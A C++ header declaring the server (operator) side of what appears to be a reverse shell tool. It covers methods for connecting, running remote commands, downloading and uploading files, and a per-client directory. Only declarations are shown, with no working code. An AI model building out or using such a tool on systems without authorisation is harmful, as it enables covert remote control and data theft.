#pragma once

#define _WIN32_WINDOWS 0x0A00
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "ReverseShellStandardFunctions.h"


class Server : public ReverseShellStandard
{
public:
    Server();

private:
    void Connect() override final;
    void ClientDedicatedDirectory();
    void Start();
    void SetClientDedicatedDirectory();
    void CreateClientDedicatedDirectory();
    OperationType ReadOperationType() override final;
    void PrintOptionsMenu();
    void RunCommand() override final;
    std::string ReadOperationInstruction(const std::string& operation);
    void RemoveUnnecessaryQuotationMark(std::string& string);
    void DownloadFile() override final;
    void UploadFile() override final;
    void InvalidOperation() override final;
    std::string CreateFileLocally(const std::string& filePath);

private:
    std::string m_clientDedicatedDirectory; 
};
